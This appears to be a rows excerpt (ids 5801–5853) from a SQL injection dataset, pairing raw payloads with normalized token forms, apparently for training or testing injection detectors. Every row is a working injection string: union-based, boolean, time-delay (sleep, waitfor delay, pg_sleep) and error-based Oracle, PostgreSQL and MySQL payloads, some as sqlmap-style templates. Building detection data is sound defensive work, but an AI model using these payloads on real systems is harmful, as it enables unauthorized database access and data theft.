id|payload_norm
"5801"|"-6561"" ) ) ) or 6872 = 6872 and ( ( ( ""azqp"" like ""azqp","- __INT__ __STR__ __IDENT__ __STR__ __IDENT__","","","0.0"
"5802"|"select * from users WHERE username = ""-9770\' ) ) as ovhh where 7903 = 7903 or username = ""1"" and username = ""-5062 ) where 7457 = 7457","select * from __IDENT__ where __IDENT__ = __STR__ __INT__ __STR__ - __INT__ ) where __INT__ = __INT__","","","0.0"
"5803"|"-2375 union all select 1573,1573,1573,1573#","- __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__","","","0.0"
"5804"|"select * from generate_series ( 6468,6468,case when ( 6468 = 7999 ) then 1 else 0 end ) limit 1--","select * from __IDENT__ ( __INT__ , __INT__ , case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) limit __INT__ - -","","","0.0"
"5805"|"select * from users WHERE username = ""1 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" and username = ""1\' ) and username = ""1\'|| ( select \'adiv\' from dual where 9842 = 9842","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __INT__ __STR__ | | ( select \ __STR__ from dual where __INT__ = __INT__","","","0.0"
"5806"|"select * from users WHERE username = ""1"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" and username = ""-1021 ) as erjh where 7845 = 7845 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --""","select * from __IDENT__ where __IDENT__ = __STR__ and __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) __STR__ - __INT__ ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __IDENT__ ( ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) - - ""","","","0.0"
"5807"|"select * from users WHERE username = ""-9742 ) where 8409 = 8409 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-6036 ) ) ) and ( ( ( 6723 = 6723""","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__","","","0.0"
"5808"|"select ( case when ( 3537 = 5218 ) then 3537 else 3537* ( select 3537 from mysql.db ) end ) #","select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ * ( select __INT__ from __IDENT__ ) end ) #","","","0.0"
"5809"|"1' ) ) and sleep ( 5 ) #","__INT__ ) ) and sleep ( __INT__ ) #","","","0.0"
"5810"|"select * from users WHERE username = ""1"" and ( 3530 = 3530"" and username = ""1\' where 8537 = 8537 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""","select * from __IDENT__ where __IDENT__ = __STR__ and ( __INT__ = __INT__ __STR__ __INT__ where __INT__ = __INT__ and __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) - - ""","","","0.0"
"5811"|"1' ) ) and sleep ( 5 ) and ( ( 'krrr' = 'krrr","__INT__ __STR__ __IDENT__ __STR__ __IDENT__","","","0.0"
"5812"|"select * from users WHERE username = ""1\' ) ) or username = ""-8007\' ) ) as bgpp where 9555 = 9555 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""1\'","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __INT__","","","0.0"
"5813"|"-6586' ) ) or 2021 = 2996","- __INT__ ) ) or __INT__ = __INT__","","","0.0"
"5814"|"select * from users WHERE username = ""-4582 ) ) as gvfo where 8885 = 8885 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""-2783%\' ) ) or username = ""-8860 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ""","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__ - __INT__ ) or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) ""","","","0.0"
"5815"|"select * from users WHERE username = ""-9295 ) ) ) and ( ( ( 8752 = 8752"" or username = ""-4582 ) ) as gvfo where 8885 = 8885 or username = ""-6661\' ) ) || 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__ - __INT__ ) ) | | __INT__ in ( ( char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + ( select ( case when ( __INT__ = __INT__ ) then char ( __INT__ ) else char ( __INT__ ) end ) ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) ) )","","","0.0"
"5816"|"select * from users WHERE username = ""-9987 ) ) ) or ( ( ( 2114 = 2114"" and username = ""-4248 where 3288 = 3288","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = "" - __INT__ where __INT__ = __INT__","","","0.0"
"5817"|"select * from users WHERE username = ""1\' ) ) ) or username = ""-5062 ) where 7457 = 7457 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""","select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) where __INT__ = __INT__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) - - ""","","","0.0"
"5818"|"select * from users WHERE username = ""-1190\' and username = ""-1985 ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""-6353%\' ) ) and ( ( \'%\' = \'""","select * from __IDENT__ where __IDENT__ = __STR__","","","0.0"
"5819"|"select * from users WHERE username = ""-7746\' ) ) ) || 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( \'itxy\' like \'itxy"" or username = ""1"" and username = ""-1190\' and \'yxry\' like \'yxry""","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__ and __IDENT__ = __STR__","","","0.0"
"5820"|"select * from users WHERE username = ""-5863"" and ""gkvy"" = ""gkvy"" and username = ""1%"" or username = ""-6523"" and 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) or ( ( ( \'enfe\' like \'enfe""","select * from __IDENT__ where __IDENT__ = __STR__ and __STR__ = __STR__ and __IDENT__ = __STR__ or __IDENT__ = __STR__ and __INT__ = __IDENT__ ( __INT__ , ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) or ( ( ( \ __STR__ like __IDENT__","","","0.0"
"5821"|"select * from users WHERE username = ""1\' and username = ""1\' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( \'mfmk\' = \'mfmk""","select * from __IDENT__ where __IDENT__ = __STR__","","","0.0"
"5822"|"1' ) ) ) waitfor delay '0:0:5' and ( ( ( 'wvzb' = 'wvzb","__INT__ __STR__ __INT__ __STR__ __IDENT__ __STR__ __IDENT__","","","0.0"
"5823"|"select * from users WHERE username = ""-9847%\' ) ) ) and ( ( ( \'%\' = \'"" or username = ""1\' where 2389 = 2389 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__","","","0.0"
"5824"|"select * from users WHERE username = ""-8069\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""-4582 ) ) as gvfo where 8885 = 8885","select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) ) as __IDENT__ where __INT__ = __INT__","","","0.0"
"5825"|"select * from users WHERE username = ""1\' where 2389 = 2389 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""1\' ) ) ) and username = ""-8828%\' ) ) ) and ( ( ( \'%\' = \'""","select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ % \ __STR__ % \ __STR__ ""","","","0.0"
"5826"|"select * from users WHERE username = ""1 ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" || username = ""1%\' ) ) and ( ( \'%\' = \'""","select * from __IDENT__ where __IDENT__ = __STR__ | | __IDENT__ = __STR__","","","0.0"
"5827"|"select * from users WHERE username = ""-2806\' ) ) ) or username = ""1\' ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( \'abcf\' like \'abcf""","select * from __IDENT__ where __IDENT__ = __STR__","","","0.0"
"5828"|"1"" ) ) as pqbs where 4409 = 4409","__INT__ ) ) as __IDENT__ where __INT__ = __INT__","","","0.0"
"5829"|"OR [RANDNUM]=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) ELSE [RANDNUM] END)","or __IDENT__ = ( select count ( * ) from __IDENT__ ) or __IDENT__ = ( case when ( __IDENT__ ) then ( select count ( * ) from __IDENT__ ) else __IDENT__ end )","","","0.0"
"5830"|"select * from users WHERE username = ""-4256\' ) where 9545 = 9545 or username = ""1 ) as nbno where 9816 = 9816 or username = ""1%\' ) ) ) and ( ( ( \'%\' = \'""","select * from __IDENT__ where __IDENT__ = __STR__","","","0.0"
"5831"|"AND UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1]) AND UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1])","and __IDENT__ ( __IDENT__ , concat ( __STR__ , __STR__ , ( select ( __IDENT__ ( __IDENT__ = __IDENT__ , __INT__ ) ) ) , __STR__ ) , __IDENT__ ) and __IDENT__ ( __IDENT__ , concat ( __STR__ , __STR__ , ( __IDENT__ ) , __STR__ ) , __IDENT__ )","","","0.0"
"5832"|"select * from users WHERE username = ""-9501\' ) and ( \'mndw\' = \'mndw"" or username = ""-6353%\' ) ) or-- 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""1 ) ) )","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__ or __IDENT__ = __INT__ ) ) )","","","0.0"
"5833"|"1"" ) ) as dnhd where 2657 = 2657 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --","__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = ( select __INT__ from __IDENT__ ( __INT__ ) ) - -","","","0.0"
"5834"|"select * from users WHERE username = ""-5863"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and username = ""-2756\' where 6156 = 6156 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""","select * from __IDENT__ where __IDENT__ = __STR__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) and __IDENT__ = __STR__","","","0.0"
"5835"|"select * from users WHERE username = ""-7323%"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ""%"" = """" or username = ""1\' ) ) and ( ( \'qtul\' like \'qtul""","select * from __IDENT__ where __IDENT__ = __STR__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) and __STR__ = __STR__ or __IDENT__ = __STR__","","","0.0"
"5836"|"select * from users WHERE username = ""1\' ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" or username = ""-5585\'","select * from __IDENT__ where __IDENT__ = __INT__ __STR__","","","0.0"
"5837"|"1 ) ) ) and elt ( 4249 = 4249,7259 ) and ( ( ( 5030 = 5030","__INT__ ) ) ) and __IDENT__ ( __INT__ = __INT__ , __INT__ ) and ( ( ( __INT__ = __INT__","","","0.0"
"5838"|"select * from users WHERE username = ""1\' ) ) ) or username = ""-1254"" or username = ""1\' ) as pogx where 4105 = 4105 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""","select * from __IDENT__ where __IDENT__ = __STR__","","","0.0"
"5839"|"1' ) union all select null,null,null,null,null,null,null#","__INT__ ) union all select null , null , null , null , null , null , null","","","0.0"
"5840"|"-3666' ) where 6386 = 6386 union all select 6386--","- __INT__ ) where __INT__ = __INT__ union all select __INT__ - -","","","0.0"
"5841"|"1' ) where 6672 = 6672 union all select null,null,null,null,null,null,null,null,null,null--","__INT__ ) where __INT__ = __INT__ union all select null , null , null , null , null , null , null , null , null , null - -","","","0.0"
"5842"|"select * from users WHERE username = ""-9987 ) ) ) and ( ( 8254 = 8254"" or username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1""","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__ __INT__","","","0.0"
"5843"|"select * from users WHERE username = ""1"" and username = ""1\' ) where 1502 = 1502 or username = ""-8163 ) ) as cvai where 2360 = 2360","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__ - __INT__ ) ) as __IDENT__ where __INT__ = __INT__","","","0.0"
"5844"|"1"" ) as lrew where 6067 = 6067 union all select null,null,null,null,null,null,null#","__INT__ ) as __IDENT__ where __INT__ = __INT__ union all select null , null , null , null , null , null , null","","","0.0"
"5845"|"select ( case when ( 4660 = 4660 ) then 4660 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--","select ( case when ( __INT__ = __INT__ ) then __INT__ else cast ( __INT__ as __IDENT__ ) / ( select __INT__ from dual ) end ) from dual - -","","","0.0"
"5846"|"select * from users WHERE username = ""-8007\' ) ) as bgpp where 9555 = 9555 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""-3899\' ) where 8152 = 8152 or username = ""1\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'esal\' = \'esal""","select * from __IDENT__ where __IDENT__ = __STR__ __INT__ __STR__ __IDENT__ __STR__ __IDENT__","","","0.0"
"5847"|"1"" where 4366 = 4366 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --","__INT__ where __INT__ = __INT__ and __INT__ = __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) , __INT__ ) - -","","","0.0"
"5848"|"select * from users WHERE username = ""1\' and username = ""-1549\' ) or username = ""-9644 ) ) and ( ( 5616 = 5616"" or username = ""-8860 )","select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) ) and ( ( __INT__ = __INT__ __STR__ - __INT__ )","","","0.0"
"5849"|"select * from users WHERE username = ""1\'+ ( select onzd where 8452 = 8452 or username = ""1 ) where 3381 = 3381 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""","select * from __IDENT__ where __IDENT__ = __STR__ __INT__ ) where __INT__ = __INT__ and __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) - - ""","","","0.0"
"5850"|"select * from users WHERE username = ""-2181\' ) and ( \'wyez\' = \'wyez"" and username = ""1\' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'yxpi\' = \'yxpi""","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__","","","0.0"
"5851"|"select * from users WHERE username = ""-3859 ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( 5846 = 5846"" and username = ""-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__","","","0.0"
"5852"|"select * from users WHERE username = ""-2348 ) as sige where 1639 = 1639 and username = ""-8007\' ) ) as bgpp where 9555 = 9555 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""-7720 ) )","select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) - - __STR__ - __INT__ ) )","","","0.0"
"5853"|"select sleep ( 5 ) and ( ( 8679 = 8679","select sleep ( __INT__ ) and ( ( __INT__ = __INT__","","","0.0"
